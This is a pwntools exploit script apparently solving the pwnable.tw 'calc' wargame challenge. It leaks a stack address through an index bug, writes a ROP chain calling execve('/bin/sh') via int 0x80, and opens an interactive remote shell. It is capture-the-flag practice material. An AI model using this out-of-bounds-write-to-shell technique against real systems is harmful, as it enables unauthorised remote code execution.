from pwn import *
import sys

#FLAG{C:\Windows\System32\calc.exe}
context.arch = 'i386'

port = 10100

def leak_binsh_addr(s):
    s.recv(1024)
    s.sendline('+'+str(360))
    ebp_addr = int(s.recv())
    rsp_addr =((ebp_addr + 0x100000000) & 0xFFFFFFF0) - 16
    binsh_addr = rsp_addr + 20 - 0x100000000
    return binsh_addr

def write_stack(s, addr,content):
    s.sendline('+'+str(addr))
    recv = int(s.recv())
    if content < recv:
        recv = recv - content
        s.sendline('+'+str(addr)+'-'+str(recv))

    else:
        recv = content-recv
        s.sendline('+'+str(addr)+'+'+str(recv))

    s.recv()

def exploit(s):
    #main ebp 0x8049c30
    #pop eax; ret 0x0805c34b
    #pop ecx ; pop ebx ; ret 0x080701d1
    #int 0x80 0x08049a21

	keys=[0x0805c34b,0xb,0x080701d1,0,0,0x08049a21,u32(b'/bin'),u32(b'/sh\0')]
	keys[4] = leak_binsh_addr(s)
	print (keys[4])
	for i in range(8):
	    write_stack(s, 361 + i,keys[i])

	#s.sendline(b'bye\n')
	s.interactive()

    

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = remote('chall.pwnable.tw', port)
        exploit(s)

    else:
        s = remote(sys.argv[1], 1346)
        input('PAUSED')
        exploit(s)
